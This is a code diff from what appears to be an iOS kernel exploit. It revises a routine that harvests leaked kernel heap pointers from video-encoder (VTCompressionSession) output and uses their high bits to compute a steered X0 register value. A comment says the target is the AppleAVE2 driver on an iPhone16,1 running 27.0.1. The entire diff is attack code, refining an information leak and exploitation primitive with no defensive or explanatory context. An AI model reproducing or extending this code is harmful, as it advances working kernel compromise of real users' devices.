@@ -177,8 +177,10 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                     size_t words = outSz / sizeof(uint64_t);
                     for (size_t w = 0; w < words && liveKPtrCount < 8; w++) {
                         uint64_t v = pageBuf[w];
-                        if (w + 1 < words && pageBuf[w + 1] == 0x000000000000beefULL) continue;
-                        if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
+                        if (KPIsContextFalsePositive(pageBuf, words, w)) continue;
+                        if (KPIsKernelPointerCandidate(v) &&
+                            !KPIsKnownDiagnosticConstant(v) &&
+                            KPClassifyKPtr(v) == KPTR_CANDIDATE_ZONE_HEAP) {
                             BOOL dup = NO;
                             for (int k = 0; k < liveKPtrCount; k++) {
                                 if ((liveKPtrs[k] >> 32) == (v >> 32)) { dup = YES; break; }
@@ -194,11 +196,15 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     }
 
     int ntl = self.ntl;
-    if (ntl <= 0 && liveKPtrCount > 0) {
-        int32_t hiSigned = (int32_t)(uint32_t)(liveKPtrs[0] >> 32);
-        ntl = 16463 + hiSigned;
-    } else if (ntl <= 0) {
+    if (ntl <= 0) {
         ntl = 16444; // 0xffffffed00000059 (AppleAVE2 outer-object band on iPhone16,1 27.0.1)
+        for (int lk = 0; lk < liveKPtrCount; lk++) {
+            uint32_t hi32 = (uint32_t)(liveKPtrs[lk] >> 32);
+            if (hi32 == 0xFFFFFFEDu || hi32 == 0xFFFFFFEFu || hi32 == 0xFFFFFFE2u) {
+                ntl = 16463 + (int32_t)hi32;
+                break;
+            }
+        }
     }
     uint64_t steeredX0 = ((uint64_t)(uint32_t)(ntl - 16463) << 32) | 0x59ULL;
 
